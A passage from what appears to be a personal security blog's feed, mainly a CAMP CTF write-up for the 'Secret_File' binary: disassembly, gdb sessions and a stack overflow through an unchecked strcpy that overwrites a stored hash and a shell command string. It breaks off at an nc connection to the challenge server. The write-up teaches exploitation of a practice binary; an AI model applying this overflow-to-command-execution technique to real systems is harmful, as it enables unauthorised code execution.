</span><span class='line'><span class="n">Enter</span> <span class="n">your</span> <span class="n">solution</span> <span class="k">as</span> <span class="n">a</span> <span class="n">single</span> <span class="nb">hex</span> <span class="n">encoded</span> <span class="n">line</span><span class="p">:</span> <span class="n">Correct</span><span class="err">!</span>
</span><span class='line'><span class="o">--------------------------------------------------------------------------------</span>
</span><span class='line'><span class="n">The</span> <span class="n">flag</span> <span class="ow">is</span><span class="p">:</span> <span class="n">CAMP15_c0342e0be22dc032de05aa637c8ee8a3</span>
</span><span class='line'>
</span><span class='line'><span class="o">***</span> <span class="n">Connection</span> <span class="n">closed</span> <span class="n">by</span> <span class="n">remote</span> <span class="n">host</span> <span class="o">***</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CAMP CTF - Secret_File]]></title>
    <link href="http://barrebas.github.io/blog/2015/08/18/camp-ctf-secret-file/"/>
    <updated>2015-08-18T21:35:08+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/08/18/camp-ctf-secret-file</id>
    <content type="html"><![CDATA[<p>In this case, we&rsquo;re asked to retrieve a secret file and given.. another binary. What did you expect? ;-)</p>

<!--more-->




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/bin/ccc/secret_file<span class="nv">$ </span>./secret_file
</span><span class='line'>AAAA
</span><span class='line'>wrong password!
</span></code></pre></td></tr></table></div></figure>


<p>Hmm. Let&rsquo;s see what makes this thing tick:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/bin/ccc/secret_file<span class="nv">$ </span>strings ./secret_file
</span><span class='line'>/lib64/ld-linux-x86-64.so.2
</span><span class='line'>x<span class="o">]</span>Cm
</span><span class='line'>libcrypto.so.1.0.0
</span><span class='line'>_ITM_deregisterTMCloneTable
</span><span class='line'>__gmon_start__
</span><span class='line'>_Jv_RegisterClasses
</span><span class='line'>_ITM_registerTMCloneTable
</span><span class='line'>SHA256_Final
</span><span class='line'>SHA256_Init
</span><span class='line'>_init
</span><span class='line'>SHA256_Update
</span><span class='line'>_fini
</span><span class='line'>libc.so.6
</span><span class='line'>strcpy
</span><span class='line'>strrchr
</span><span class='line'>puts
</span><span class='line'>__stack_chk_fail
</span><span class='line'>stdin
</span><span class='line'>popen
</span><span class='line'>fgets
</span><span class='line'>fclose
</span><span class='line'>getline
</span><span class='line'>__cxa_finalize
</span><span class='line'>strcmp
</span><span class='line'>__libc_start_main
</span><span class='line'>snprintf
</span><span class='line'>_edata
</span><span class='line'>__bss_start
</span><span class='line'>_end
</span><span class='line'>GLIBC_2.4
</span><span class='line'>GLIBC_2.2.5
</span><span class='line'>AUATUSH
</span><span class='line'><span class="o">[]</span>A<span class="se">\A</span><span class="o">]</span>
</span><span class='line'>D<span class="nv">$x1</span>
</span><span class='line'>D<span class="nv">$xdH3</span>
</span><span class='line'><span class="o">[]</span>A<span class="se">\A</span><span class="o">]</span>
</span><span class='line'>D<span class="nv">$h1</span>
</span><span class='line'>/bin/catH
</span><span class='line'> ./secreH
</span><span class='line'>t_data.aH
</span><span class='line'>9387a00eH
</span><span class='line'>D<span class="nv">$ </span>H
</span><span class='line'>31e413c5H
</span><span class='line'>D<span class="k">$(</span>H
</span><span class='line'>5af9c08cH
</span><span class='line'>D<span class="nv">$0H</span>
</span><span class='line'>69cd119aH
</span><span class='line'>D<span class="nv">$8H</span>
</span><span class='line'>b4685ef3H
</span><span class='line'>D<span class="nv">$@</span>H
</span><span class='line'>bc8bcbe1H
</span><span class='line'>D<span class="nv">$HH</span>
</span><span class='line'>cf821611H
</span><span class='line'>D<span class="nv">$PH</span>
</span><span class='line'>19457127H
</span><span class='line'>D<span class="nv">$X1</span>
</span><span class='line'>D<span class="nv">$hdH3</span>
</span><span class='line'>AWAVA
</span><span class='line'>AUATL
</span><span class='line'><span class="o">[]</span>A<span class="se">\A</span><span class="o">]</span>A^A_
</span><span class='line'>%02x
</span><span class='line'>wrong password!
</span><span class='line'><span class="p">;</span>*3<span class="nv">$&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>We see strings like <code>bc8bcbe1H</code>, which look like part of a hash being pushed onto the stack. Combining the hash part gives a SHA256 hash which has no known plaintext. Hmmm! Since this is an exploit-focused binary, let&rsquo;s exploit it!</p>

<p>It gets interesting around this code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'> e8e:    rep stos QWORD PTR es:<span class="o">[</span>rdi<span class="o">]</span>,rax
</span><span class='line'> e91: lea    rdi,<span class="o">[</span>rbx+0x100<span class="o">]</span>
</span><span class='line'> e98: mov    rcx,rsp
</span><span class='line'> e9b: movabs rax,0x7461632f6e69622f
</span><span class='line'> ea5: mov    QWORD PTR <span class="o">[</span>rsp<span class="o">]</span>,rax
</span><span class='line'> ea9: movabs rax,0x65726365732f2e20
</span><span class='line'> eb3: mov    QWORD PTR <span class="o">[</span>rsp+0x8<span class="o">]</span>,rax
</span><span class='line'> eb8: movabs rax,0x612e617461645f74
</span><span class='line'> ec2: mov    QWORD PTR <span class="o">[</span>rsp+0x10<span class="o">]</span>,rax
</span><span class='line'> ec7: mov    eax,0x6373
</span><span class='line'> ecc: mov    WORD PTR <span class="o">[</span>rsp+0x18<span class="o">]</span>,ax
</span><span class='line'> ed1: xor    eax,eax
</span><span class='line'> ed3: call   a30 &lt;snprintf@plt&gt;
</span><span class='line'> ed8: lea    rcx,<span class="o">[</span>rsp+0x20<span class="o">]</span>
</span><span class='line'> edd: mov    esi,0x41
</span><span class='line'> ee2: movabs rax,0x6530306137383339
</span><span class='line'> eec: mov    QWORD PTR <span class="o">[</span>rsp+0x20<span class="o">]</span>,rax
</span><span class='line'> ef1: lea    rdi,<span class="o">[</span>rbx+0x11b<span class="o">]</span>
</span><span class='line'> ef8: movabs rax,0x3563333134653133
</span><span class='line'> f02: mov    QWORD PTR <span class="o">[</span>rsp+0x28<span class="o">]</span>,rax
</span><span class='line'> f07: lea    rdx,<span class="o">[</span>rip+0x106<span class="o">]</span>        <span class="c"># 1014 &lt;_fini+0x10&gt;</span>
</span><span class='line'> f0e: movabs rax,0x6338306339666135
</span><span class='line'> f18: mov    QWORD PTR <span class="o">[</span>rsp+0x30<span class="o">]</span>,rax
</span><span class='line'> f1d: movabs rax,0x6139313164633936
</span><span class='line'> f27: mov    QWORD PTR <span class="o">[</span>rsp+0x38<span class="o">]</span>,rax
</span><span class='line'> f2c: movabs rax,0x3366653538363462
</span><span class='line'> f36: mov    QWORD PTR <span class="o">[</span>rsp+0x40<span class="o">]</span>,rax
</span><span class='line'> f3b: movabs rax,0x3165626362386362
</span><span class='line'> f45: mov    QWORD PTR <span class="o">[</span>rsp+0x48<span class="o">]</span>,rax
</span><span class='line'> f4a: movabs rax,0x3131363132386663
</span><span class='line'> f54: mov    QWORD PTR <span class="o">[</span>rsp+0x50<span class="o">]</span>,rax
</span><span class='line'> f59: movabs rax,0x3732313735343931
</span><span class='line'> f63: mov    QWORD PTR <span class="o">[</span>rsp+0x58<span class="o">]</span>,rax
</span><span class='line'> f68: xor    eax,eax
</span><span class='line'> f6a: mov    BYTE PTR <span class="o">[</span>rsp+0x60<span class="o">]</span>,0x0
</span><span class='line'> f6f: call   a30 &lt;snprintf@plt&gt;
</span><span class='line'> f74: mov    rax,QWORD PTR <span class="o">[</span>rsp+0x68<span class="o">]</span>
</span><span class='line'> f79: xor    rax,QWORD PTR fs:0x28
</span><span class='line'> f82: jne    f8a &lt;__cxa_finalize@plt+0x4aa&gt;
</span><span class='line'> f84: add    rsp,0x70
</span><span class='line'> f88: pop    rbx
</span><span class='line'> f89: ret
</span></code></pre></td></tr></table></div></figure>


<p>It passes a few strings to the stack. We&rsquo;ll be seeing them later. Let&rsquo;s run the binary in <code>gdb</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>checksec
</span><span class='line'>CANARY    : ENABLED
</span><span class='line'>FORTIFY   : disabled
</span><span class='line'>NX        : ENABLED
</span><span class='line'>PIE       : ENABLED
</span><span class='line'>RELRO     : FULL
</span></code></pre></td></tr></table></div></figure>


<p>PIE is enabled, so find out the base address of the binary with <code>vmmap</code>. Our input gets processed here:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'> b40:    call   ad0 &lt;getline@plt&gt;
</span><span class='line'> b45: cmp    rax,0xffffffffffffffff
</span><span class='line'> b49: je     c4c &lt;__cxa_finalize@plt+0x16c&gt;
</span><span class='line'> b4f: mov    rdi,QWORD PTR <span class="o">[</span>rsp+0x8<span class="o">]</span>
</span><span class='line'> b54: mov    esi,0xa
</span><span class='line'> b59: call   a40 &lt;strrchr@plt&gt;
</span><span class='line'> b5e: <span class="nb">test   </span>rax,rax
</span><span class='line'> b61: je     c4c &lt;__cxa_finalize@plt+0x16c&gt;
</span><span class='line'> b67: mov    BYTE PTR <span class="o">[</span>rax<span class="o">]</span>,0x0
</span><span class='line'> b6a: mov    rsi,QWORD PTR <span class="o">[</span>rsp+0x8<span class="o">]</span>
</span><span class='line'> b6f: mov    rdi,r13
</span><span class='line'> b72: lea    rbp,<span class="o">[</span>r13+0x15c<span class="o">]</span>
</span><span class='line'> b79: lea    rbx,<span class="o">[</span>r13+0x17c<span class="o">]</span>
</span><span class='line'> b80: lea    r12,<span class="o">[</span>r13+0x1bc<span class="o">]</span>
</span><span class='line'> b87: call   9e0 &lt;strcpy@plt&gt;
</span></code></pre></td></tr></table></div></figure>


<p>We have an unchecked <code>strcpy</code>. Lovely. Let&rsquo;s see what it will copy where:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>vmmap
</span><span class='line'>Start              End                Perm    Name
</span><span class='line'>0x0000555555554000 0x0000555555556000 r-xp    /home/bas/bin/ccc/secret_file/secret_file
</span><span class='line'>0x0000555555755000 0x0000555555756000 r--p    /home/bas/bin/ccc/secret_file/secret_file
</span><span class='line'>0x0000555555756000 0x0000555555757000 rw-p    /home/bas/bin/ccc/secret_file/secret_file
</span><span class='line'>...
</span><span class='line'>gdb-peda<span class="nv">$ </span>b *0x0000555555554000+0xb87
</span><span class='line'>Breakpoint <span class="m">4</span> at 0x555555554b87
</span><span class='line'>gdb-peda<span class="nv">$ </span>c
</span><span class='line'>
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'><span class="o">=</span>&gt; 0x555555554b87:  call   0x5555555549e0 &lt;strcpy@plt&gt;
</span><span class='line'>   0x555555554b8c:    mov    edx,0x100
</span><span class='line'>   0x555555554b91:    mov    rsi,rbp
</span><span class='line'>   0x555555554b94:    mov    rdi,r13
</span><span class='line'>   0x555555554b97:    call   0x555555554dd0
</span><span class='line'>Guessed arguments:
</span><span class='line'>arg<span class="o">[</span>0<span class="o">]</span>: 0x7fffffffe190 --&gt; 0x0
</span><span class='line'>arg<span class="o">[</span>1<span class="o">]</span>: 0x555555757010 --&gt; 0x41414141 <span class="o">(</span><span class="s1">&#39;AAAA&#39;</span><span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>So it will copy our input to the stack. Let&rsquo;s examine the stack:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>x/200wx 0x7fffffffe190
</span><span class='line'>0x7fffffffe190:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x7fffffffe1a0:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x7fffffffe1b0:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x7fffffffe1c0:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x7fffffffe1d0:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x7fffffffe1e0:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x7fffffffe1f0:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x7fffffffe200:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x7fffffffe210:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x7fffffffe220:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x7fffffffe230:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x7fffffffe240:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x7fffffffe250:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x7fffffffe260:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x7fffffffe270:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x7fffffffe280:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x7fffffffe290:   0x6e69622f  0x7461632f  0x732f2e20  0x65726365
</span><span class='line'>0x7fffffffe2a0:   0x61645f74  0x612e6174  0x39006373  0x61373833
</span><span class='line'>0x7fffffffe2b0:   0x33653030  0x31346531  0x35356333  0x63396661
</span><span class='line'>0x7fffffffe2c0:   0x36633830  0x31646339  0x62613931  0x35383634
</span><span class='line'>0x7fffffffe2d0:   0x62336665  0x63623863  0x63316562  0x31323866
</span><span class='line'>0x7fffffffe2e0:   0x31313136  0x37353439  0x00373231  0x00007fff
</span><span class='line'>0x7fffffffe2f0:   0x00000000  0x00000000  0xf7ffa828  0x00007fff
</span><span class='line'>0x7fffffffe300:   0xffffe390  0x00007fff  0xffffe3a8  0x00007fff
</span><span class='line'>0x7fffffffe310:   0x00000000  0x00000001  0xf7ffe758  0x00007fff
</span><span class='line'>0x7fffffffe320:   0x13742321  0x00000000  0xf7a071ef  0x00007fff
</span></code></pre></td></tr></table></div></figure>


<p>Nice, what are those bytes at <code>0x7fffffffe290</code>?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>x/2s 0x7fffffffe290
</span><span class='line'>0x7fffffffe290:    <span class="s2">&quot;/bin/cat ./secret_data.asc&quot;</span>
</span><span class='line'>0x7fffffffe2ab:    <span class="s2">&quot;9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Hey, that second one looks like the SHA256 hash! We&rsquo;ll be able to overwrite this&hellip; Seeing as it&rsquo;s stored as a string, better set a breakpoint on <code>strcmp()</code> for later&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'> bd5:    call   a80 &lt;strcmp@plt&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Restarted the binary:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>b *0x0000555555554000+0xbd5
</span><span class='line'>Breakpoint <span class="m">2</span> at 0x555555554bd5
</span><span class='line'>gdb-peda<span class="nv">$ </span>c
</span><span class='line'>AAAA
</span><span class='line'>
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'><span class="o">=</span>&gt; 0x555555554bd5:  call   0x555555554a80 &lt;strcmp@plt&gt;
</span><span class='line'>   0x555555554bda:    mov    r12d,eax
</span><span class='line'>   0x555555554bdd:    <span class="nb">test   </span>eax,eax
</span><span class='line'>   0x555555554bdf:    jne    0x555555554c40
</span><span class='line'>   0x555555554be1:    lea    rdi,<span class="o">[</span>r13+0x100<span class="o">]</span>
</span><span class='line'>Guessed arguments:
</span><span class='line'>arg<span class="o">[</span>0<span class="o">]</span>: 0x7fffffffe2ab <span class="o">(</span><span class="s2">&quot;9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127&quot;</span><span class="o">)</span>
</span><span class='line'>arg<span class="o">[</span>1<span class="o">]</span>: 0x7fffffffe30c <span class="o">(</span><span class="s2">&quot;003daa08bd98e706782e059cbadf83277b5296645a98dfb636131e32cd7f131d&quot;</span><span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>OK, so it will compare the SHA256 hash of our input with the one stored on the stack. The nice thing, however, is that it will only hash the first 0x100 bytes! This means we can predict the hash we get:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>r
</span><span class='line'>warning: the debug information found in <span class="s2">&quot;/lib64/ld-2.13.so&quot;</span> does not match <span class="s2">&quot;/lib64/ld-linux-x86-64.so.2&quot;</span> <span class="o">(</span>CRC mismatch<span class="o">)</span>.
</span><span class='line'>
</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span><span class='line'>
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'>   0x555555554bc5:    jne    0x555555554ba0
</span><span class='line'>   0x555555554bc7:    lea    rsi,<span class="o">[</span>r13+0x17c<span class="o">]</span>
</span><span class='line'>   0x555555554bce:    lea    rdi,<span class="o">[</span>r13+0x11b<span class="o">]</span>
</span><span class='line'><span class="o">=</span>&gt; 0x555555554bd5:  call   0x555555554a80 &lt;strcmp@plt&gt;
</span><span class='line'>
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'>Guessed arguments:
</span><span class='line'>arg<span class="o">[</span>0<span class="o">]</span>: 0x7fffffffe2ab <span class="o">(</span><span class="s2">&quot;9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127&quot;</span><span class="o">)</span>
</span><span class='line'>arg<span class="o">[</span>1<span class="o">]</span>: 0x7fffffffe30c <span class="o">(</span><span class="s2">&quot;e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb&quot;</span><span class="o">)</span>
</span><span class='line'>
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'>Breakpoint 2, 0x0000555555554bd5 in ?? <span class="o">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>And if we do it again, but send 512 * &lsquo;A&rsquo;:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>r
</span><span class='line'>warning: the debug information found in <span class="s2">&quot;/lib64/ld-2.13.so&quot;</span> does not match <span class="s2">&quot;/lib64/ld-linux-x86-64.so.2&quot;</span> <span class="o">(</span>CRC mismatch<span class="o">)</span>.
</span><span class='line'>
</span><span class='line
</span><span class='line'>
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'><span class="o">=</span>&gt; 0x555555554bd5:  call   0x555555554a80 &lt;strcmp@plt&gt;
</span><span class='line'>   0x555555554bda:    mov    r12d,eax
</span><span class='line'>   0x555555554bdd:    <span class="nb">test   </span>eax,eax
</span><span class='line'>   0x555555554bdf:    jne    0x555555554c40
</span><span class='line'>   0x555555554be1:    lea    rdi,<span class="o">[</span>r13+0x100<span class="o">]</span>
</span><span class='line'>Guessed arguments:
</span><span class='line'>arg<span class="o">[</span>0<span class="o">]</span>: 0x7fffffffe2ab <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">65</span> <span class="nb">times</span>&gt;<span class="s2">&quot;\340, u\362\365\034\255#\320Sq\206\317\315P\371\021\352\225O\234.2\244\067\364S&#39;\361\267\211\233\273e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb&quot;</span><span class="o">)</span>
</span><span class='line'>arg<span class="o">[</span>1<span class="o">]</span>: 0x7fffffffe30c <span class="o">(</span><span class="s2">&quot;e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb&quot;</span><span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;ve overwritten part of the hash on the stack, yet the hash of our input stayed the same. After some trial &amp; error, I could reliably overwrite the hash:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/bin/ccc/secret_file<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAe075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb&#39;</span> <span class="p">|</span> ./secret_file
</span><span class='line'>sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAe075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb: not found
</span></code></pre></td></tr></table></div></figure>


<p>What&rsquo;s left now is to exploit it to grab the flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc challs.campctf.ccc.ac 10105
